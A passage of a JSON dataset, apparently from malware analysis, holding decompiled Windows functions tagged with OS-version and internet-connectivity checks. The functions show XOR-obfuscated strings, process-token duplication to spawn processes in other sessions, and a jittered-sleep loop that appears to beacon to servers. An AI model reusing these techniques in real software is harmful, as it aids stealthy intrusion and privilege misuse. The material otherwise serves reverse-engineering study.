        "decompiled_code": "\nuint __fastcall fcn.004025e8(uint *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint lpCommandLine;\n    uint var_44h;\n    \n    iVar2 = 0x44;\n    puVar3 = param_1;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_44h;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_44h = 0x44;\n    puVar3 = &lpCommandLine;\n    for (iVar1 = 0x208; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpCommandLine, L\"%s --\", *0x41ccc0);\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_44h, param_1);\n    if (param_1[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[1]);\n    }\n    return *param_1;\n}\n",
        "token_count": 360
    },
    "00402665": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00402665(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    code *pcVar8;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uchar var_64h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint var_57h;\n    uchar uStack87;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    uint ARG_0;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t ProcessHandle;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint *dwProcessId;\n    uint var_18h;\n    uchar *var_14h;\n    uchar *var_10h;\n    int32_t var_ch;\n    uint TokenInformationLength;\n    int32_t TokenHandle;\n    \n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_3ch = 0x104;\n    var_14h = puVar3;\n    uVar2 = (*pcVar7)(8, 0x208);\n    var_10h = (*pcVar8)(uVar2);\n    TokenInformationLength = 0;\n    var_38h = 0x104;\n    var_30h = 0;\n    uVar2 = 0;\n    if ((puVar3 != NULL) && (var_10h != NULL)) {\n        ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, dwProcessId);\n        pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (ProcessHandle != 0) {\n            var_6ch = 0x2239470b;\n            var_68h = 0x79282b1f;\n            for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = var_10h;\n            for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            var_ch = 6;\n            _var_64h = 0x2b153106;\n            stack0xffffff9c = 0x3e1c513c;\n            stack0xffffffa0 = 0x5f053715;\n            var_5bh._3_1_ = 3;\n            var_57h._0_2_ = 0x1432;\n            var_57h._2_1_ = 0x59;\n            var_4ch = 0x57683051;\n            var_48h._0_2_ = 0x597a;\n            uVar2 = (*pcVar7)(8, 0x19);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar6 = 0;\n            var_24h = iVar4;\n            var_20h = &var_6ch - iVar4;\n            do {\n                puVar1 = iVar6 + iVar4;\n                iVar5 = iVar6 % var_ch;\n                iVar6 = iVar6 + 1;\n                *puVar1 = *(&var_4ch + iVar5) ^ puVar1[&var_6ch - iVar4];\n            } while (iVar6 < 0x18);\n            iVar6 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x20008, &TokenHandle);\n            if ((iVar6 != 0) || (pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap,  TokenHandle == 0)) {\n                stack0xffffff9c = 0x1f050b2c;\n                stack0xffffffa0 = 0x5c741629;\n                var_5bh._3_1_ = 0x59;\n                var_57h._0_2_ = 0x2015;\n                var_57h._2_1_ = 0x16;\n                stack0xffffffa8 = CONCAT11(uStack87, 0x47);\n                var_4ch = 0x71776e47;\n                var_48h._0_2_ = 0x7a4c;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n                iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar4 = 0;\n                var_20h = iVar6;\n                do {\n                    puVar1 = iVar4 + iVar6;\n                    iVar5 = iVar4 % var_ch;\n                    iVar4 = iVar4 + 1;\n                    *puVar1 = *(&var_4ch + iVar5) ^ puVar1[&var_63h + (3 - iVar6)];\n                } while (iVar4 < 0xd);\n                var_40h = fcn.00401a3a();\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (var_40h != 0) {\n                    stack0xffffff9c = 0x20345b24;\n                    stack0xffffffa0 = 0x631e5617;\n                    var_5bh._3_1_ = 0x33;\n                    var_57h._0_2_ = 0x1031;\n                    var_57h._2_1_ = 0x4e;\n                    stack0xffffffa8 = CONCAT11(uStack87, 0x72);\n                    dwProcessId = 0x54463272;\n                    var_18h._0_2_ = 0x3762;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_4ch = iVar4;\n                    do {\n                        puVar1 = iVar6 + iVar4;\n                        iVar5 = iVar6 % var_ch;\n                        iVar6 = iVar6 + 1;\n                        *puVar1 = *(&dwProcessId + iVar5) ^ puVar1[&var_63h + (3 - iVar4)];\n                    } while (iVar6 < 0xd);\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &TokenInformationLength);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    iVar6 = var_20h;\n                    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if (iVar5 == 0x7a) {\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n                        dwProcessId = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (dwProcessId != NULL) {\n                            iVar5 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                              (TokenHandle, 1, dwProcessId, TokenInformationLength, \n                                               &TokenInformationLength);\n                            if (iVar5 != 0) {\n                                iVar5 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *dwProcessId, var_14h, &var_3ch, var_10h, &var_38h, &var_50h);\n                                if (iVar5 != 0) {\n                                    var_78h = 0x75747937;\n                                    var_74h = 0x79375614;\n                                    var_70h = 0x56087578;\n                                    var_6ch = 0x750b792a;\n                                    var_68h = 0x7938561b;\n                                    _var_64h = 0x56347514;\n                                    stack0xffffff9c = 0x75147938;\n                                    stack0xffffffa0 = 0x79385634;\n                                    var_5bh._3_1_ = 0x14;\n                                    var_57h._0_2_ = 0x2375;\n                                    var_57h._2_1_ = 0x56;\n                                    stack0xffffffa8 = 0x7964;\n                                    var_30h = 0x75317964;\n                                    var_2ch._0_2_ = 0x5647;\n                                    uVar2 = (*pcVar7)(8, 0x4d);\n                                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                    iVar6 = 0;\n                                    do {\n                                        puVar1 = iVar6 + iVar4;\n                                        iVar5 = iVar6 % var_ch;\n                                        iVar6 = iVar6 + 1;\n                                        *puVar1 = *(&var_30h + iVar5) ^ puVar1[&var_78h - iVar4];\n                                    } while (iVar6 < 0x26);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar4, var_10h, var_14h, var_40h);\n                                    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    var_30h = 1;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                    iVar6 = var_20h;\n                                    iVar4 = var_4ch;\n                                }\n                            }\n                            uVar2 = (*pcVar7)(0, dwProcessId);\n                            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                        }\n                    }\n                    uVar2 = (*pcVar7)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n                iVar4 = var_24h;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n                uVar2 = (*pcVar7)(0, iVar6);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(ProcessHandle);\n            uVar2 = (*pcVar7)(0, iVar4);\n            (*pcVar8)(uVar2);\n            puVar3 = var_14h;\n        }\n        uVar2 = (*pcVar7)(0, var_10h);\n        (*pcVar8)(uVar2);\n        uVar2 = (*pcVar7)(0, puVar3);\n        (*pcVar8)(uVar2);\n        uVar2 = var_30h;\n    }\n    return uVar2;\n}\n",
        "token_count": 2578
    },
    "00404069": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00404069(uint param_1, int32_t *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    int32_t *piVar9;\n    uint *puVar10;\n    code *pcVar11;\n    uint lpApplicationName;\n    uint var_c8h;\n    int32_t var_c0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t ProcessHandle;\n    uint TokenHandle;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint pSessionId;\n    uint dwProcessId;\n    uint hExistingToken;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_44h;\n    int32_t *var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint hToken;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_dh;\n    uchar var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_44h._0_2_ = 0x1000;\n    iVar7 = 0;\n    piVar9 = param_2;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar9 = 0;\n        piVar9 = piVar9 + 1;\n    }\n    pSessionId = 0;\n    puVar10 = &var_c8h;\n    dwProcessId = param_1;\n    var_40h = param_2;\n    for (iVar4 = 0x44; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_60h = 0;\n    puVar10 = &var_7ch;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    hToken = 0;\n    hExistingToken = 0;\n    var_3ch = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (ProcessHandle != 0) {\n        var_18h._0_2_ = 0xb2c;\n        var_5ch = 5;\n        var_18h._2_1_ = 5;\n        stack0xffffffe7 = 0x7416291f;\n        var_11h._0_1_ = 0x5c;\n        var_11h._1_1_ = 0x59;\n        var_11h._2_2_ = 0x2015;\n        var_dh._0_1_ = 0x16;\n        var_dh._1_1_ = 0x47;\n        var_8h = 0x71776e47;\n        var_4h._0_2_ = 0x7a4c;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_64h = 6;\n        var_30h = &var_18h - iVar4;\n        do {\n            puVar1 = iVar7 + iVar4;\n            iVar5 = iVar7 % 6;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_8h + iVar5) ^ puVar1[&var_18h - iVar4];\n        } while (iVar7 < 0xd);\n        var_74h = iVar4;\n        iVar7 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n        pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar7 != 0) {\n            iVar7 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            if (iVar7 != 0) {\n                fcn.00402ceb();\n                iVar7 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar2 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar7 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar4 != 0) {\n                        var_78h = 0x20;\n                        var_7ch = pSid;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar2)(hToken, 0x19, &var_7ch, iVar4 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    dwProcessId = 0;\n                    (*pcVar2)(hToken, 0x1b, &dwProcessId, 4);\n                    iVar4 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_3ch, hToken, 1);\n                    if (iVar4 == 0) {\n                        var_3ch = 0;\n                    }\n                    else {\n                        var_60h = 0x400;\n                    }\n                    var_c8h = 0x44;\n                    var_28h = 0x701e511e;\n                    var_24h = 0x7722691d;\n                    var_20h = 0x51087304;\n                    var_1ch = 0x692f7047;\n                    var_18h._0_2_ = 0x7735;\n                    var_18h._2_1_ = 0x15;\n                    stack0xffffffe7 = 0x16510f73;\n                    var_11h._0_1_ = 0x70;\n                    var_11h._1_1_ = 6;\n                    var_11h._2_2_ = 0x3d69;\n                    var_dh._0_1_ = 0x77;\n                    var_dh._1_1_ = 4;\n                    var_dh._2_1_ = 0x73;\n                    var_dh._3_1_ = 0x69;\n                    var_9h = 0x51;\n                    var_38h = 0x70775169;\n                    var_34h._0_1_ = 0x73;\n                    uVar3 = (*pcVar11)(8, 0x41);\n                    var_c0h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar4 = 0;\n                    var_30h = &var_28h - var_c0h;\n                    do {\n                        puVar1 = iVar4 + var_c0h;\n                        iVar7 = iVar4 % var_5ch;\n                        iVar4 = iVar4 + 1;\n                        *puVar1 = *(&var_38h + iVar7) ^ puVar1[&var_28h - var_c0h];\n                    } while (iVar4 < 0x20);\n                    var_98h._0_2_ = 0;\n                    var_9ch = 1;\n                    var_70h = var_c0h;\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpApplicationName, L\"%s --\", *0x41ccc0);\n                    var_1ch = 0x6b57336b;\n                    var_18h._0_2_ = 0x4931;\n                    var_18h._2_1_ = 0x11;\n                    stack0xffffffe7 = 0x69424772;\n                    var_11h._0_1_ = 0x33;\n                    var_11h._1_1_ = 0x57;\n                    var_11h._2_2_ = 0x316b;\n                    var_dh._0_1_ = 0x49;\n                    var_dh._1_1_ = 0x33;\n                    var_dh._2_1_ = 0x72;\n                    var_8h = 0x6b723349;\n                    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x42);\n                    uVar3 = (*pcVar11)(8, 0x25);\n                    var_38h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar4 = 0;\n                    var_30h = &var_1ch - var_38h;\n                    do {\n                        puVar1 = iVar4 + var_38h;\n                        iVar7 = iVar4 % var_5ch;\n                        iVar4 = iVar4 + 1;\n                        *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_1ch - var_38h];\n                    } while (iVar4 < 0x12);\n                    iVar5 = 0;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, &lpApplicationName, 0, 0, 0, 0, var_60h, var_3ch, 0, &var_c8h, var_40h);\n                    var_1ch = 0x6415532e;\n                    var_18h._0_2_ = 0x503e;\n                    var_18h._2_1_ = 0x23;\n                    stack0xffffffe7 = 0x39641353;\n                    var_11h._0_1_ = 0x50;\n                    var_11h._1_1_ = 0x38;\n                    var_11h._2_2_ = 0xb53;\n                    var_dh._0_1_ = 100;\n                    var_dh._1_1_ = 0x50;\n                    var_dh._2_1_ = 0x50;\n                    var_8h = 0x64645356;\n                    var_4h._0_2_ = 0x5050;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar4 = var_38h;\n                    var_30h = &var_1ch - iVar7;\n                    do {\n                        puVar1 = iVar5 + iVar7;\n                        iVar6 = iVar5 % var_64h;\n                        iVar5 = iVar5 + 1;\n                        *puVar1 = *(&var_8h + iVar6) ^ puVar1[&var_1ch - iVar7];\n                        pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    } while (iVar5 < 0x12);\n                    if (*var_40h != 0) {\n                        iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*var_40h, 0x201eb, &TokenHandle);\n                        if (iVar5 != 0) {\n                            fcn.00402ceb();\n                            (*pcVar8)(TokenHandle);\n                        }\n                        (*pcVar8)(var_40h[1]);\n                    }\n                    if (var_3ch != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_3ch);\n                    }\n                    (*pcVar8)(hToken);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n                    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*pcVar2)(uVar3);\n                    uVar3 = (*pcVar11)(0, var_70h);\n                    (*pcVar2)(uVar3);\n                    iVar4 = var_74h;\n                }\n                (*pcVar8)(hExistingToken);\n            }\n        }\n        (*pcVar8)(ProcessHandle);\n        uVar3 = (*pcVar11)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return *var_40h;\n}\n",
        "token_count": 3030
    },
    "00404eea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00404eea(uint param_1, int32_t *param_2)\n\n{\n    uint8_t *puVar1;\n    bool bVar2;\n    char cVar3;\n    uint uVar4;\n    char *pcVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_23h;\n    ushort var_1fh;\n    uchar var_1dh;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = -1;\n    var_8h = *0x41cd3c;\n    var_44h = 0x12543824;\n    var_40h = 0x3222023c;\n    var_3ch = 0x8321c5e;\n    var_38h._0_2_ = 0x3428;\n    var_38h._2_1_ = 0x58;\n    var_4h = 6;\n    var_38h._3_1_ = 6;\n    var_34h = 0x2e361628;\n    var_30h = 0x1c2e0042;\n    var_2ch = 0x5b19203c;\n    stack0xffffffd5 = 0x3697755;\n    var_23h = 0x7d536f43;\n    var_1fh = 0x763;\n    var_1dh = 0x76;\n    var_14h = 0x76375a45;\n    var_10h._0_2_ = 0x6459;\n    var_28h._0_1_ = var_38h._3_1_;\n    var_1ch = param_2;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar8 = 0;\n    do {\n        puVar1 = pcVar5 + iVar8;\n        iVar7 = iVar8 % var_4h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_14h + iVar7) ^ puVar1[&var_44h - pcVar5];\n    } while (iVar8 < 0x28);\n    iVar8 = 0;\n    pcVar9 = str.QGFF__;\n    do {\n        var_14h = 1;\n        var_4h = 0;\n        do {\n            if (pcVar9[iVar8] != '\\0') {\n                cVar3 = *pcVar5;\n                pcVar6 = pcVar5;\n                while (cVar3 != pcVar9[iVar8]) {\n                    if (cVar3 == '\\0') {\n                        bVar2 = false;\n                        goto code_r0x00404fd6;\n                    }\n                    pcVar6 = pcVar6 + 1;\n                    cVar3 = *pcVar6;\n                }\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < 0x20);\n        bVar2 = true;\ncode_r0x00404fd6:\n        if (((*pcVar9 != '\\0') && (pcVar9[0x1f] == '\\0')) && (bVar2)) {\n            iVar7 = fcn.0040c840();\n            if (iVar7 != -1) {\n                *var_1ch = iVar7;\n                var_ch = iVar8;\n                break;\n            }\n            var_8h = var_8h * 0x19660d + 0x3c6ef35f;\n            (*_sym.imp.KERNEL32.dll_Sleep)(var_8h % 600000 + 60000);\n        }\n        pcVar9 = pcVar9 + 0x20;\n        iVar8 = iVar8 + 1;\n    } while (pcVar9 < 0x41c760);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return var_ch;\n}\n",
        "token_count": 1046
    },
    "00405051": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040511e)\n\nuint __cdecl fcn.00405051(uint arg_8h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t uStack24;\n    uchar auStack16 [12];\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_OutputDebugStringA;\n    puVar4 = auStack16;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = 0x41ccb0;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    (*pcVar1)(\"WMA 0\");\n    iVar3 = fcn.00407ff4();\n    if (iVar3 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41ccbc);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    cVar2 = fcn.0040e1a9();\n    if ((cVar2 != '\\0') && (iVar3 = fcn.00405172(0),  iVar3 != 0)) {\n        (*pcVar1)(\"WMA 1\");\n        fcn.00407fc3();\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41ccbc);\n    }\n    while (*0x41cd2c == 0) {\n        iVar3 = fcn.00404eea();\n        if (iVar3 != -1) {\n            fcn.0040c6f5();\n        }\n        uStack24 = uStack24 * 0x19660d + 0x3c6ef35f;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uStack24 % 600000 + 60000);\n    }\n    return 0;\n}\n",
        "token_count": 472
    },
    "00405172": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405172(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint *in_EDX;\n    char *pcVar3;\n    uint uVar4;\n    char *pcVar5;\n    uint *puVar6;\n    char *pcVar7;\n    uint var_d8h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    puVar6 = &var_ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    uVar4 = 0;\n    puVar6 = &var_d8h;\n    var_10h = in_EDX;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    if (((*in_ECX != 0) && (in_ECX[1] != 0)) && (iVar2 = fcn.0040fa5b(),  -1 < iVar2)) {\n        var_4h = fcn.00407cb6(var_8h, var_ch);\n        if (var_4h != NULL) {\n            pcVar3 = str.QGFF__;\n            pcVar5 = var_4h;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = str.QGFF__;\n            pcVar7 = var_4h;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar7 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n                pcVar7 = pcVar7 + 1;\n            }\n            pcVar5 = var_4h;\n            for (iVar2 = 0x140; pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyA,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(var_4h, str.QGFF__ + arg_8h * 0x20);\n            pcVar5 = var_4h;\n            do {\n                pcVar5 = pcVar5 + 0x20;\n                if (*pcVar3 != '\\0') {\n                    (*pcVar1)(pcVar5, pcVar3);\n                }\n                pcVar3 = pcVar3 + 0x20;\n                in_EDX = var_10h;\n            } while (pcVar3 < 0x41c740);\n        }\n        fcn.00407fc3();\n        *in_EDX = var_ch;\n        uVar4 = 1;\n        in_EDX[1] = var_8h;\n    }\n    return uVar4;\n}\n",
        "token_count": 737
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    code *pcVar4;\n    uchar *puVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    code *pcVar12;\n    uint var_288h;\n    uint var_88h;\n    int32_t var_84h;\n    int32_t var_80h;\n    uchar *var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uchar var_50h;\n    uint var_4fh;\n    uint var_4bh;\n    uint var_47h;\n    uchar var_41h;\n    uchar var_40h;\n    ushort var_3fh;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_31h;\n    uint var_2dh;\n    uchar *lpLibFileName;\n    code *var_24h;\n    int32_t pszSrch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    ushort var_ch;\n    uchar uStack14;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    var_88h = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar4)(uVar2 | 2);\n    var_18h = 0xd7d1c3c;\n    var_14h = 0x7a5d782e;\n    var_10h._0_2_ = 0x2d5c;\n    var_10h._2_1_ = 0xe;\n    var_10h._3_1_ = 0x4b;\n    var_8h = 0x4138546f;\n    var_4h._0_2_ = 